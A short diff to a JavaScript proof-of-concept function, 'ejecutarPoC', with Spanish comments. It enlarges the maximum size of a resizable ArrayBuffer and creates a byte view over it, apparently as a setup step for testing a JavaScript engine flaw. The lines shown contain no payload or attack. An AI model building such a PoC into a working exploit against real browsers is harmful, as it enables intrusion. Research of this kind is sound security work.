@@ -1,7 +1,7 @@
 function ejecutarPoC() {
   try {
-    // Paso 1: Crear un ArrayBuffer redimensionable de 0x1000 bytes
-    const buffer = new ArrayBuffer(0x1000, { maxByteLength: 0x1000 });
+    // Paso 1: Crear un ArrayBuffer redimensionable de 0x1000 bytes con un tamaño máximo de 0x4000 bytes
+    const buffer = new ArrayBuffer(0x1000, { maxByteLength: 0x4000 });
 
     // Paso 2: Crear un Uint8Array basado en el buffer
     const view = new Uint8Array(buffer);
